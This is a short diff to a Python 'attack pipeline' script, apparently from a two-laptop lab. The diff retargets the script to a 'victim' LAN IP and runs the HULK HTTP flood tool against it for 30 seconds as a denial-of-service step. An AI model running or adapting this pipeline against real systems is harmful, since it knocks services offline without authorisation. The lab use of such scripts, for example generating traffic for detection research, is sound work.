@@ -3,7 +3,7 @@ import time
 import os
 
 # CẤU HÌNH ĐỊA CHỈ IP CỦA LAPTOP 2 (MÁY NẠN NHÂN)
-VICTIM_IP = "192.168.1.2"  # IP thực tế của Laptop 2
+VICTIM_IP = "192.168.0.103"  # IP thực tế của Laptop 2
 
 def run_command(command, description):
     print(f"\n{'='*50}")
@@ -71,9 +71,9 @@ def attack_pipeline():
         time.sleep(10)
 
         # 7. DoS Hulk (cần clone script trước)
-        if os.path.exists("/opt/hulk/hulk.py"):
+        if os.path.exists("./hulk/hulk.py"):
             run_command(
-                f"timeout 30s python3 /opt/hulk/hulk.py http://{VICTIM_IP}",
+                f"timeout 30s python3 ./hulk/hulk.py http://{VICTIM_IP}",
                 "DoS Hulk"
             )
             time.sleep(10)
